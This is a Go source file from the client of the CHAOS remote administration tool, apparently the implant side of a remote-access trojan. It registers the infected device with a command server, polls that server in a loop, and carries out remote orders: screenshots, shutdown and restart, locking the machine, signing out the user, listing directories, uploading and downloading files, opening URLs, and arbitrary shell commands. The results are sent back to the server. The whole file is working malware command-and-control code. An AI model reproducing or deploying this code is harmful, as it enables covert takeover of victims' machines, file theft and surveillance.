package handler

import (
	"encoding/json"
	"fmt"
	"github.com/tiagorlampert/CHAOS/client/app/entities"
	"github.com/tiagorlampert/CHAOS/client/app/gateway"
	"github.com/tiagorlampert/CHAOS/client/app/services"
	"github.com/tiagorlampert/CHAOS/client/app/shared/environment"
	"github.com/tiagorlampert/CHAOS/client/app/utilities/encode"
	"log"
	"net/http"
	"strings"
	"time"
)

type Handler struct {
	Configuration *environment.Configuration
	Gateway       gateway.Gateway
	Services      *services.Services
	MacAddress    string
	Connected     bool
	DoingRequest  bool
}

func NewHandler(config *environment.Configuration, gateway gateway.Gateway, services *services.Services) *Handler {
	specs, err := services.Information.LoadDeviceSpecs()
	if err != nil {
		panic(err)
	}
	return &Handler{
		Configuration: config,
		Gateway:       gateway,
		Services:      services,
		MacAddress:    specs.MacAddress,
	}
}

func (h *Handler) ConnectWithServer() {
	sleepTime := 2 * time.Minute
	for {
		go func() {
			if h.ServerIsAvailable() {
				if err := h.SendDeviceSpecs(); err != nil {
					sleepTime = 20 * time.Second
					h.Connected = false
					return
				}
				sleepTime = 2 * time.Minute
				h.Connected = true
				return
			}
			sleepTime = 5 * time.Second
			h.Connected = false
		}()
		time.Sleep(sleepTime)
	}
}

func (h *Handler) ServerIsAvailable() bool {
	url := fmt.Sprint(h.Configuration.Server.URL, h.Configuration.Server.Health)
	res, err := h.Gateway.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return false
	}
	return res.StatusCode == http.StatusOK
}

func (h *Handler) SendDeviceSpecs() error {
	specs, err := h.Services.Information.LoadDeviceSpecs()
	if err != nil {
		return err
	}
	body, err := json.Marshal(specs)
	if err != nil {
		return err
	}
	res, err := h.Gateway.NewRequest(http.MethodPost,
		fmt.Sprint(h.Configuration.Server.URL, h.Configuration.Server.Device), body)
	if err != nil {
		return err
	}
	if res.StatusCode != http.StatusOK {
		return err
	}
	return nil
}

func (h *Handler) RequestDone() {
	h.DoingRequest = false
}

func (h *Handler) HandleServerRequest() {
	commandURL := fmt.Sprint(h.Configuration.Server.URL, h.Configuration.Server.Command)

	for {
		time.Sleep(2 * time.Second)
		if h.DoingRequest || !h.Connected {
			continue
		}

		go func() {
			defer h.RequestDone()
			h.DoingRequest = true

			res, err := h.Gateway.NewRequest(http.MethodGet,
				fmt.Sprint(commandURL, "?address=", encode.Base64Encode(h.MacAddress)), nil)
			if err != nil {
				return
			}
			if res.StatusCode == http.StatusNoContent {
				return
			}

			var payload entities.Payload
			if err := json.Unmarshal(res.ResponseBody, &payload); err != nil {
				return
			}
			if len(strings.TrimSpace(payload.Request)) == 0 {
				return
			}

			var response []byte
			var hasErr bool
			switch strings.ToLower(strings.TrimSpace(payload.Request)) {
			case "getos":
				deviceSpecs, err := h.Services.Information.LoadDeviceSpecs()
				if err != nil {
					hasErr = true
					response = encode.StringToByte(err.Error())
					break
				}
				response = encode.StringToByte(encode.PrettyJson(deviceSpecs))
				break
			case "screenshot":
				screenshot, err := h.Services.Screenshot.TakeScreenshot()
				if err != nil {
					hasErr = true
					response = encode.StringToByte(err.Error())
					break
				}
				response = screenshot
				break
			case "restart":
				if err := h.Services.OS.Restart(); err != nil {
					hasErr = true
					response = encode.StringToByte(err.Error())
				}
				break
			case "shutdown":
				if err := h.Services.OS.Shutdown(); err != nil {
					hasErr = true
					response = encode.StringToByte(err.Error())
				}
				break
			case "lock":
				if err := h.Services.OS.Lock(); err != nil {
					hasErr = true
					response = encode.StringToByte(err.Error())
				}
				break
			case "sign-out":
				if err := h.Services.OS.SignOut(); err != nil {
					hasErr = true
					response = encode.StringToByte(err.Error())
				}
				break
			default:
				//FILE EXPLORER
				if strings.Contains(payload.Request, h.Configuration.CommandHandler.CommandFileExplorer) &&
					strings.TrimSpace(payload.Request[:len(h.Configuration.CommandHandler.CommandFileExplorer)]) == h.Configuration.CommandHandler.CommandFileExplorer {
					fileExplorer, err := h.Services.Explorer.ExploreDirectory(strings.TrimSpace(strings.ReplaceAll(payload.Request, h.Configuration.CommandHandler.CommandFileExplorer, "")))
					if err != nil {
						response = encode.StringToByte(err.Error())
						hasErr = true
						break
					}
					explorerBytes, _ := json.Marshal(fileExplorer)
					response = explorerBytes
					break
				}

				//DOWNLOAD FILE
				if strings.Contains(payload.Request, h.Configuration.CommandHandler.CommandDownload) &&
					payload.Request[:len(h.Configuration.CommandHandler.CommandDownload)] == h.Configuration.CommandHandler.CommandDownload {
					filePath := strings.TrimSpace(strings.TrimLeft(payload.Request, h.Configuration.CommandHandler.CommandDownload))
					res, err := h.Services.Upload.UploadFile(filePath, fmt.Sprint(h.Configuration.Server.URL, h.Configuration.Server.Upload), "file")
					if err != nil {
						response = encode.StringToByte(err.Error())
						hasErr = true
						break
					}
					response = res
					break
				}

				//UPLOAD FILE
				if strings.Contains(payload.Request, h.Configuration.CommandHandler.CommandUpload) &&
					payload.Request[:len(h.Configuration.CommandHandler.CommandUpload)] == h.Configuration.CommandHandler.CommandUpload {
					filePath := strings.TrimSpace(strings.TrimLeft(payload.Request, h.Configuration.CommandHandler.CommandUpload))
					res, err := h.Services.Download.DownloadFile(filePath)
					if err != nil {
						response = encode.StringToByte(err.Error())
						hasErr = true
						break
					}
					response = res
					break
				}

				//OPEN URL
				if strings.Contains(payload.Request, h.Configuration.CommandHandler.CommandOpenURL) &&
					payload.Request[:len(h.Configuration.CommandHandler.CommandOpenURL)] == h.Configuration.CommandHandler.CommandOpenURL {
					url := strings.TrimSpace(strings.TrimPrefix(payload.Request, h.Configuration.CommandHandler.CommandOpenURL))
					err := h.Services.URL.OpenURL(url)
					if err != nil {
						response = encode.StringToByte(err.Error())
						hasErr = true
						break
					}
					break
				}

				//SHELL
				response = encode.StringToByte(h.Services.Terminal.Run(payload.Request, h.Configuration.Connection.ContextDeadline))
			}

			requestBody, err := json.Marshal(entities.Payload{
				MacAddress: h.MacAddress,
				Response:   response,
				HasError:   hasErr,
			})
			if err != nil {
				return
			}

			res, err = h.Gateway.NewRequest(http.MethodPut, commandURL, requestBody)
			if err != nil || res.StatusCode != http.StatusOK {
				log.Println(err)
			}
		}()
	}
}
